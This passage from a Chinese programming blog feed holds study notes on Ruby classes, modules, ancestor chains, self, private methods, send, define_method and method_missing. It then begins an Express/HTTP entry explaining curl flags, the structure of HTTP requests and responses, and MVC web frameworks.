class="line"><span class="keyword">end</span></span><br></pre></td></tr></table></figure><h2 id="Class"><a href="#Class" class="headerlink" title="Class"></a>Class</h2><h3 id="重复的-class"><a href="#重复的-class" class="headerlink" title="重复的 class"></a>重复的 class</h3><figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">3.</span>times <span class="keyword">do</span></span><br><span class="line">  <span class="keyword">class</span> <span class="symbol">C</span></span><br><span class="line">    <span class="symbol">p</span> &#x27;<span class="symbol">hello</span>&#x27;</span><br><span class="line">  <span class="symbol">end</span></span><br><span class="line"><span class="symbol">end</span></span><br></pre></td></tr></table></figure><blockquote><p>验证只是 class 可以重复声明且会自动合并</p></blockquote><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> C</span><br><span class="line">  <span class="keyword">def</span> <span class="title function_">x</span></span><br><span class="line">    p <span class="string">&#x27;x&#x27;</span></span><br><span class="line">  <span class="keyword">end</span></span><br><span class="line"><span class="keyword">end</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> C</span><br><span class="line">  <span class="keyword">def</span> <span class="title function_">y</span></span><br><span class="line">    p <span class="string">&#x27;y&#x27;</span></span><br><span class="line">  <span class="keyword">end</span></span><br><span class="line"><span class="keyword">end</span></span><br><span class="line"></span><br><span class="line">z = C.new</span><br><span class="line">z.x</span><br><span class="line">z.y</span><br></pre></td></tr></table></figure><h3 id="自定义一个-class"><a href="#自定义一个-class" class="headerlink" title="自定义一个 class"></a>自定义一个 class</h3><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">MyClass</span></span><br><span class="line">  <span class="keyword">def</span> <span class="title function_">initialize</span></span><br><span class="line">    <span class="variable">@v</span> = <span class="number">1</span></span><br><span class="line">  <span class="keyword">end</span></span><br><span class="line">  <span class="keyword">def</span> <span class="title function_">add</span></span><br><span class="line">    <span class="variable">@v</span> += <span class="number">1</span></span><br><span class="line">  <span class="keyword">end</span></span><br><span class="line"><span class="keyword">end</span></span><br><span class="line"></span><br><span class="line">obj = <span class="title class_">MyClass</span>.new</span><br><span class="line"></span><br><span class="line">p obj.<span class="keyword">class</span></span><br><span class="line">p obj.add</span><br><span class="line">p obj.instance_variables</span><br><span class="line">p <span class="title class_">MyClass</span>.instance_variables</span><br><span class="line">p obj.methods</span><br><span class="line">p <span class="title class_">MyClass</span>.instance_methods</span><br><span class="line">p obj.methods.grep(<span class="regexp">/add/</span>)</span><br></pre></td></tr></table></figure><blockquote><p>证明，一个对象的实例变量储存在自身，一个对象的实例方法存储在其类身上</p></blockquote><h2 id="superclass-（类似于-JS-的原型链）"><a href="#superclass-（类似于-JS-的原型链）" class="headerlink" title="superclass （类似于 JS 的原型链）"></a>superclass （类似于 JS 的原型链）</h2><figure class="highlight vbnet"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">p <span class="comment">&#x27;----String----&#x27;</span></span><br><span class="line">p <span class="type">String</span>.superclass # <span class="type">Object</span></span><br><span class="line">p <span class="type">Object</span>.superclass # BasicObject</span><br><span class="line">p BasicObject.superclass # nil</span><br><span class="line"></span><br><span class="line">p <span class="type">String</span>.is_a? <span class="keyword">Class</span></span><br><span class="line"></span><br><span class="line">p <span class="comment">&#x27;----Array----&#x27;</span></span><br><span class="line">p Array.superclass # <span class="type">Object</span></span><br><span class="line">p Array.is_a? <span class="keyword">Class</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="keyword">MyClass</span>; <span class="keyword">end</span></span><br><span class="line">p <span class="keyword">MyClass</span>.superclass # <span class="type">Object</span></span><br><span class="line">p <span class="keyword">MyClass</span>.is_a? <span class="keyword">Class</span></span><br><span class="line"></span><br><span class="line">p <span class="comment">&#x27;class is a Class?&#x27;</span></span><br><span class="line">p <span class="keyword">Class</span>.is_a? <span class="keyword">Class</span></span><br><span class="line"></span><br><span class="line">p <span class="keyword">Class</span>.superclass # <span class="keyword">Module</span></span><br><span class="line"># 模块是低配版的类，类是高配版的模块</span><br></pre></td></tr></table></figure><blockquote><p>模块是低配版的类，类是高配版的模块</p></blockquote><h2 id="常量"><a href="#常量" class="headerlink" title="常量"></a>常量</h2><figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">Const1 = <span class="string">&#x27;root const&#x27;</span></span><br><span class="line">module MyModule</span><br><span class="line">  Const1 = <span class="string">&#x27;outer const&#x27;</span></span><br><span class="line">  <span class="keyword">class</span> <span class="symbol">MyClass</span></span><br><span class="line">    <span class="symbol">Const1</span> = &#x27;<span class="symbol">inner</span> <span class="symbol">const</span>&#x27;</span><br><span class="line">    <span class="symbol">p</span> ::<span class="symbol">Const1</span> # &#x27;<span class="symbol">root</span> <span class="symbol">const</span>&#x27;</span><br><span class="line">  <span class="symbol">end</span></span><br><span class="line"><span class="symbol">end</span></span><br><span class="line"></span><br><span class="line"><span class="symbol">p</span> <span class="symbol">Const1</span> # &#x27;<span class="symbol">root</span> <span class="symbol">const</span>&#x27;</span><br><span class="line"><span class="symbol">p</span> <span class="symbol">MyModule::<span class="symbol">Const1</span></span> # &#x27;<span class="symbol">outer</span> <span class="symbol">const</span>&#x27;</span><br><span class="line"><span class="symbol">p</span> <span class="symbol">MyModule::<span class="symbol">MyClass</span>::<span class="symbol">Const1</span></span> # &#x27;<span class="symbol">inner</span> <span class="symbol">const</span>&#x27;</span><br></pre></td></tr></table></figure><blockquote><p>使用 <code>::</code> 打印出内部的常量，直接使用 <code>::</code> 可以打印出根的常量</p></blockquote><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-tag">p</span> <span class="string">&#x27;------------&#x27;</span></span><br><span class="line"><span class="selector-tag">p</span> MyModule.constants</span><br></pre></td></tr></table></figure><blockquote><p>使用 MyModule.constants 得到 MyModule 的内部的所有一级常量</p></blockquote><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="title class_">Const1</span> = <span class="string">&#x27;root const&#x27;</span></span><br><span class="line"><span class="keyword">module</span> <span class="title class_">MyModule</span></span><br><span class="line">  <span class="title class_">Const1</span> = <span class="string">&#x27;outer const&#x27;</span></span><br><span class="line">  <span class="keyword">class</span> <span class="title class_">MyClass</span></span><br><span class="line">    <span class="title class_">Const1</span> = <span class="string">&#x27;inner const&#x27;</span></span><br><span class="line">    p <span class="string">&#x27;Module.nesting&#x27;</span></span><br><span class="line">    p <span class="title class_">Module</span>.nesting <span class="comment"># [MyModule::MyClass, MyModule]</span></span><br><span class="line">  <span class="keyword">end</span></span><br><span class="line"><span class="keyword">end</span></span><br></pre></td></tr></table></figure><blockquote><p>使用 Module.nesting 得到 当前作用域的层级结构</p></blockquote><h2 id="祖先链"><a href="#祖先链" class="headerlink" title="祖先链"></a>祖先链</h2><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">MyClass</span></span><br><span class="line">  <span class="keyword">def</span> <span class="title function_">my_class</span></span><br><span class="line">    <span class="string">&#x27;my_class&#x27;</span></span><br><span class="line">  <span class="keyword">end</span></span><br><span class="line"><span class="keyword">end</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">MySubClass</span> &lt; <span class="title class_ inherited__">MyClass</span> <span class="comment"># &lt; 表示继承</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">end</span></span><br><span class="line"></span><br><span class="line">obj = <span class="title class_">MySubClass</span>.new</span><br><span class="line"></span><br><span class="line">p obj.my_class</span><br><span class="line">p <span class="title class_">MySubClass</span>.ancestors <span class="comment"># [MySubClass, MyClass, Object, Kernel, BasicObject] # 其中 Kernel 是祖先模块</span></span><br></pre></td></tr></table></figure><h2 id="module"><a href="#module" class="headerlink" title="module"></a>module</h2><blockquote><p>模块和类非常非常像，只是模块不能继承</p></blockquote><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">module</span> <span class="title class_">M1</span></span><br><span class="line">  <span class="keyword">def</span> <span class="title function_">my_methods</span></span><br><span class="line">    <span class="string">&#x27;M1#my_methods&#x27;</span></span><br><span class="line">  <span class="keyword">end</span></span><br><span class="line"><span class="keyword">end</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">C1</span></span><br><span class="line">  <span class="keyword">include</span> <span class="title class_">M1</span> <span class="comment"># 相当于 C1 &lt; M1，但是不能继承一个模块，只能继承一个类</span></span><br><span class="line"><span class="keyword">end</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">A1</span> &lt; <span class="title class_ inherited__">C1</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">end</span></span><br><span class="line"></span><br><span class="line">p <span class="variable constant_">A1</span>.ancestors <span class="comment"># [A1, C1, M1, Object, Kernel, BasicObject] # 从 C1 ~ Object 之间有个 M1 得出，Object 里肯定有 include Kernel，所以上面的祖先链中会多出现一个 Kernel</span></span><br></pre></td></tr></table></figure><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">module</span> <span class="title class_">M1</span></span><br><span class="line">  <span class="keyword">def</span> <span class="title function_">my_methods</span></span><br><span class="line">    <span class="string">&#x27;M1#my_methods&#x27;</span></span><br><span class="line">  <span class="keyword">end</span></span><br><span class="line"><span class="keyword">end</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">C1</span></span><br><span class="line">  <span class="keyword">prepend</span> <span class="variable constant_">M1</span></span><br><span class="line"><span class="keyword">end</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">A1</span> &lt; <span class="title class_ inherited__">C1</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">end</span></span><br><span class="line"></span><br><span class="line">p <span class="variable constant_">A1</span>.ancestors <span class="comment"># [A1, M1, C1, Object, Kernel, BasicObject]</span></span><br></pre></td></tr></table></figure><blockquote><p>使用 include (上面增加)和 prepend（下面增加）<br>可以在类中引入模块，用来改变方法查找顺序，使得继承组合更加多样化</p></blockquote><h2 id="self-method-的查找方法"><a href="#self-method-的查找方法" class="headerlink" title="self (method 的查找方法)"></a>self (method 的查找方法)</h2><h3 id="self-是当前对象"><a href="#self-是当前对象" class="headerlink" title="self 是当前对象"></a>self 是当前对象</h3><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">MyClass</span></span><br><span class="line">  <span class="keyword">def</span> <span class="title function_">test_self</span></span><br><span class="line">    <span class="variable">@var</span> = <span class="number">10</span></span><br><span class="line">    me_method</span><br><span class="line">    <span class="variable language_">self</span></span><br><span class="line">  <span class="keyword">end</span></span><br><span class="line">  <span class="keyword">def</span> <span class="title function_">me_method</span></span><br><span class="line">    <span class="variable">@var</span> += <span class="number">1</span></span><br><span class="line">  <span class="keyword">end</span></span><br><span class="line"><span class="keyword">end</span></span><br><span class="line"></span><br><span class="line">obj = <span class="title class_">MyClass</span>.new</span><br><span class="line">p obj.test_self <span class="comment"># #&lt;MyClass:0x00000000051488b8 <span class="doctag">@var</span>=11&gt;</span></span><br></pre></td></tr></table></figure><blockquote><p>可以看到 @var 已经是 11 了，<br>注意：这里执行到 me_method 的时候，不是像js一样直接往下在当前对象上找到 me_method 这个方法，而是这样的执行顺序：<br>先找 obj 上的 test_self， 在MyClass 上找到，执行该方法，该方法声明了 @var 并执行 me_method 方法（注意：这里的 me_method 会再次找 obj &#x3D;&gt; MyClass &#x3D;&gt; def me_method，再执行）<strong>注意调用该方法时，self已经变了，所以 me_method 才能给 @var 加一</strong>，最后返回 self</p></blockquote><h3 id="特殊：顶级的-self"><a href="#特殊：顶级的-self" class="headerlink" title="特殊：顶级的 self"></a>特殊：顶级的 self</h3><figure class="highlight crystal"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">p <span class="keyword">self</span> <span class="comment"># main</span></span><br></pre></td></tr></table></figure><blockquote><p>p 出来的肯定是对象，为什么是 main，只需要改写其 to_s 和 inspect 方法即可，</p></blockquote><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">o1 = &#123;<span class="symbol">name:</span> <span class="string">&#x27;zch&#x27;</span>&#125;</span><br><span class="line">p o1</span><br><span class="line">p <span class="variable language_">self</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Temp</span></span><br><span class="line">  <span class="keyword">def</span> <span class="title function_">to_s</span></span><br><span class="line">    <span class="string">&#x27;temp&#x27;</span></span><br><span class="line">  <span class="keyword">end</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">def</span> <span class="title function_">inspect</span></span><br><span class="line">    <span class="string">&#x27;temp&#x27;</span></span><br><span class="line">  <span class="keyword">end</span></span><br><span class="line"><span class="keyword">end</span></span><br><span class="line">p <span class="title class_">Temp</span>.new</span><br></pre></td></tr></table></figure><h3 id="self-也可以是类"><a href="#self-也可以是类" class="headerlink" title="self 也可以是类"></a>self 也可以是类</h3><figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="symbol">MyClass2</span></span><br><span class="line">  <span class="symbol">p</span> &#x27;<span class="symbol">MyClass2</span>&#x27;</span><br><span class="line">  <span class="symbol">p</span> <span class="symbol">self</span> # <span class="symbol">self</span> 是类</span><br><span class="line">  <span class="symbol">def</span> <span class="symbol">my_method</span></span><br><span class="line">    <span class="symbol">p</span> <span class="symbol">self</span></span><br><span class="line">  <span class="symbol">end</span></span><br><span class="line"><span class="symbol">end</span></span><br></pre></td></tr></table></figure><h2 id="私有方法"><a href="#私有方法" class="headerlink" title="私有方法"></a>私有方法</h2><figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="symbol">MyClass</span></span><br><span class="line">  <span class="symbol">def</span> <span class="symbol">public_method</span></span><br><span class="line">    &#x27;<span class="symbol">MyClass::<span class="symbol">public_method</span></span>&#x27;</span><br><span class="line">  <span class="symbol">end</span></span><br><span class="line">  <span class="symbol">private</span></span><br><span class="line">  <span class="symbol">def</span> <span class="symbol">private_method1</span></span><br><span class="line">    &#x27;<span class="symbol">MyClass::<span class="symbol">private_method1</span></span>&#x27;</span><br><span class="line">  <span class="symbol">end</span></span><br><span class="line">  <span class="symbol">def</span> <span class="symbol">private_method2</span></span><br><span class="line">    &#x27;<span class="symbol">MyClass::<span class="symbol">private_method2</span></span>&#x27;</span><br><span class="line">  <span class="symbol">end</span></span><br><span class="line"><span class="symbol">end</span></span><br></pre></td></tr></table></figure><blockquote><p>使用 private 分隔私有方法，非常机智，private 以上都是不是私有的，下面都是私有的</p></blockquote><figure class="highlight haxe"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">obj = MyClass.<span class="keyword">new</span><span class="type"></span></span><br><span class="line">obj.public_method</span><br><span class="line">obj.private_methods1 <span class="meta"># 报错</span></span><br><span class="line">obj.private_methods2 <span class="meta"># 报错</span></span><br></pre></td></tr></table></figure><h3 id="调用-private-方法"><a href="#调用-private-方法" class="headerlink" title="调用 private 方法"></a>调用 private 方法</h3><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">MyClass</span></span><br><span class="line">  <span class="keyword">def</span> <span class="title function_">public_method1</span></span><br><span class="line">    <span class="variable language_">self</span>.private_method1 <span class="comment"># 报错</span></span><br><span class="line">  <span class="keyword">end</span></span><br><span class="line">  <span class="keyword">def</span> <span class="title function_">public_method2</span></span><br><span class="line">    private_method1</span><br><span class="line">  <span class="keyword">end</span></span><br><span class="line">  <span class="keyword">private</span></span><br><span class="line">  <span class="keyword">def</span> <span class="title function_">private_method1</span></span><br><span class="line">    <span class="string">&#x27;MyClass::private_method1&#x27;</span></span><br><span class="line">  <span class="keyword">end</span></span><br><span class="line">  <span class="keyword">def</span> <span class="title function_">private_method2</span></span><br><span class="line">    <span class="string">&#x27;MyClass::private_method2&#x27;</span></span><br><span class="line">  <span class="keyword">end</span></span><br><span class="line"><span class="keyword">end</span></span><br></pre></td></tr></table></figure><blockquote><p>私有方法调用必须满足如下情况</p><ol><li>必须在对象所在的类中调用</li><li>不能再前面加 self 字样（只能隐式指定 self）</li></ol></blockquote><h2 id="动态调用方法"><a href="#动态调用方法" class="headerlink" title="动态调用方法"></a>动态调用方法</h2><blockquote><p>调用方法有两种</p><ol><li>obj.xx_method(‘hi’)</li><li>obj.send(:xx_method, ‘hi’)</li></ol></blockquote><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Notification</span></span><br><span class="line">  <span class="keyword">def</span> <span class="title function_">notify</span>(<span class="params">witch</span>)</span><br><span class="line">    send <span class="string">&quot;notify_<span class="subst">#&#123;witch&#125;</span>&quot;</span></span><br><span class="line">  <span class="keyword">end</span></span><br><span class="line">  <span class="keyword">private</span></span><br><span class="line">  <span class="keyword">def</span> <span class="title function_">notify_wx</span></span><br><span class="line">    p <span class="string">&#x27;通知到威信&#x27;</span></span><br><span class="line">  <span class="keyword">end</span></span><br><span class="line">  <span class="keyword">def</span> <span class="title function_">notify_qq</span></span><br><span class="line">    p <span class="string">&#x27;通知到qq&#x27;</span></span><br><span class="line">  <span class="keyword">end</span></span><br><span class="line">  <span class="keyword">def</span> <span class="title function_">notify_phone</span></span><br><span class="line">    p <span class="string">&#x27;通知到手机&#x27;</span></span><br><span class="line">  <span class="keyword">end</span></span><br><span class="line">  <span class="keyword">def</span> <span class="title function_">notify_all</span></span><br><span class="line">    notify_wx</span><br><span class="line">    notify_qq</span><br><span class="line">    notify_phone</span><br><span class="line">  <span class="keyword">end</span></span><br><span class="line"><span class="keyword">end</span></span><br><span class="line"></span><br><span class="line">obj = <span class="title class_">Notification</span>.new</span><br><span class="line">obj.notify(<span class="string">&#x27;qq&#x27;</span>)</span><br></pre></td></tr></table></figure><blockquote><p><strong>注意</strong> send 调用方法不分共、私有，上述可以直接 <code>obj.send(:notify_qq, &#39;hi&#39;)</code>。(ruby 中的私有方法更像是一种君子协定：)，另外你也可以使用 public_send，这样就不能调用私有方法了</p></blockquote><h3 id="动态定义方法"><a href="#动态定义方法" class="headerlink" title="动态定义方法"></a>动态定义方法</h3><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">MyClass</span></span><br><span class="line">  x = <span class="symbol">:methods1</span></span><br><span class="line">  <span class="built_in">define_method</span> x <span class="keyword">do</span> |<span class="params">n</span>|</span><br><span class="line">    n * <span class="number">3</span></span><br><span class="line">  <span class="keyword">end</span></span><br><span class="line"><span class="keyword">end</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">require</span> <span class="string">&#x27;test/unit&#x27;</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">MyClassTest</span> &lt; <span class="title class_ inherited__">Test::Unit::TestCase</span></span><br><span class="line">  <span class="keyword">def</span> <span class="title function_">test_1</span></span><br><span class="line">    obj = <span class="title class_">MyClass</span>.new</span><br><span class="line">    assert_equal <span class="number">6</span>, obj.methods1(<span class="number">2</span>)</span><br><span class="line">  <span class="keyword">end</span></span><br><span class="line"><span class="keyword">end</span></span><br></pre></td></tr></table></figure><blockquote><p>动态定义的好处：可以在运行时决定方法的名字，而不是写代码时<br>这在批量创建方法时非常有用</p></blockquote><h2 id="自定义未定义方法（狗头）"><a href="#自定义未定义方法（狗头）" class="headerlink" title="自定义未定义方法（狗头）"></a>自定义未定义方法（狗头）</h2><figure class="highlight vbnet"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="keyword">MyClass</span>;<span class="keyword">end</span></span><br><span class="line">obj = <span class="keyword">MyClass</span>.<span class="built_in">new</span></span><br><span class="line">obj.xxx</span><br></pre></td></tr></table></figure><blockquote><p>调用 <code>obj.xxx</code>， 一般来说调用一个未定义的方法，其他语言会直接报错，但是 ruby 不会，obj 会一直向上查找，直到调用 <code>BaseObject#method_missing</code> 这个方法去报错<br>也就等同于 <code>obj.send(:method_missing, :xxx)</code> ，这两个报错一模一样，即可验证</p></blockquote><h4 id="所以我们就可以直接覆盖-method-mssing"><a href="#所以我们就可以直接覆盖-method-mssing" class="headerlink" title="所以我们就可以直接覆盖 method_mssing"></a>所以我们就可以直接覆盖 method_mssing</h4><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">MyClass</span></span><br><span class="line">  <span class="keyword">private</span> <span class="keyword">def</span> <span class="title function_">method_missing</span>(<span class="params">method, *args</span>)</span><br><span class="line">    p <span class="string">&quot;method:<span class="subst">#&#123;method&#125;</span>,参数：<span class="subst">#&#123;args&#125;</span>&quot;</span></span><br><span class="line">    p <span class="string">&#x27;找不到方法啊，大哥&#x27;</span></span><br><span class="line">  <span class="keyword">end</span></span><br><span class="line"><span class="keyword">end</span></span><br><span class="line"></span><br><span class="line">obj = <span class="title class_">MyClass</span>.new</span><br><span class="line"></span><br><span class="line">obj.xxx(<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>)</span><br></pre></td></tr></table></figure><blockquote><p>这么做以后，就可以让一个对象响应任何一个方法<br>例如可以看看 hashie 的库，lib&#x3D;&gt;mash&#x3D;&gt;method_missing 定义了更好用的对象</p></blockquote>]]></content>
      
      
      <categories>
          
          <category> Rails </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>Express 核心</title>
      <link href="/Blog/2020/09/02/node_js/Express%E6%A0%B8%E5%BF%83/index/"/>
      <url>/Blog/2020/09/02/node_js/Express%E6%A0%B8%E5%BF%83/index/</url>
      
        <content type="html"><![CDATA[<h1 id="HTTP-协议"><a href="#HTTP-协议" class="headerlink" title="HTTP 协议"></a>HTTP 协议</h1><h2 id="curl"><a href="#curl" class="headerlink" title="curl"></a>curl</h2><h3 id="curl-s-v-网址"><a href="#curl-s-v-网址" class="headerlink" title="curl -s -v 网址"></a>curl -s -v 网址</h3><ul><li>-s 是 silent，用于隐藏进度条</li><li>-v 是 verbose，用于打印全部 header</li><li>* 开头的是注释</li><li>&gt; 开头的是 HTTP 请求</li><li>&lt; 开头的是 HTTP 响应</li><li>-o nul 是为了隐藏 HTML 文本（LINUX 和 mac 要将 nul 改成 &#x2F;dev&#x2F;null）</li></ul><h2 id="请求"><a href="#请求" class="headerlink" title="请求"></a>请求</h2><ul><li><strong>GET &#x2F;xxx HTTP&#x2F;1.1</strong></li><li>HOST: baidu.com</li><li>User-Agent: curl&#x2F;7.70.0</li><li>Accept: <em>&#x2F;</em></li><li></li><li>{user: “admin”}</li></ul><blockquote><p>分为四部分<br>一、请求行<br>二、请求头<br>三、回车<br>四、请求体 &#x2F; 消息体</p></blockquote><h2 id="响应"><a href="#响应" class="headerlink" title="响应"></a>响应</h2><h2 id="HTTP-x2F-1-1-200-OK-Content-Type-text-x2F-html-Content-Length-2381"><a href="#HTTP-x2F-1-1-200-OK-Content-Type-text-x2F-html-Content-Length-2381" class="headerlink" title="HTTP&#x2F;1.1 200 OK- Content-Type: text&#x2F;html- Content-Length: 2381"></a>HTTP&#x2F;1.1 200 OK<br>- Content-Type: text&#x2F;html<br>- Content-Length: 2381</h2><ul><li><html>...</html></li></ul><blockquote><p>分为四部分<br>一、状态行<br>二、响应头<br>三、回车<br>四、响应体 &#x2F; 消息体</p></blockquote><h3 id="HTTP-的复杂性"><a href="#HTTP-的复杂性" class="headerlink" title="HTTP 的复杂性"></a>HTTP 的复杂性</h3><ul><li>HTTP 复杂就复杂在他有很多请求头和响应头</li><li>每个请求头或响应头功能各不相同</li></ul><h2 id="Web-框架"><a href="#Web-框架" class="headerlink" title="Web 框架"></a>Web 框架</h2><ul><li><strong>功能</strong></li><li>更方便的处理 HTTP 的请求和响应</li><li>更方便的连接数据库、Redis</li><li>更方便的路由</li><li>其他：HTML 模版</li><li><strong>理念</strong></li><li>Web 框架的主流思想都是 MVC</li><li>Model 处理数据相关的逻辑</li><li>View 处理视图相关逻辑，前后分离之后，View 不重要</li><li>Controller 负责其他逻辑</li></ul><h2 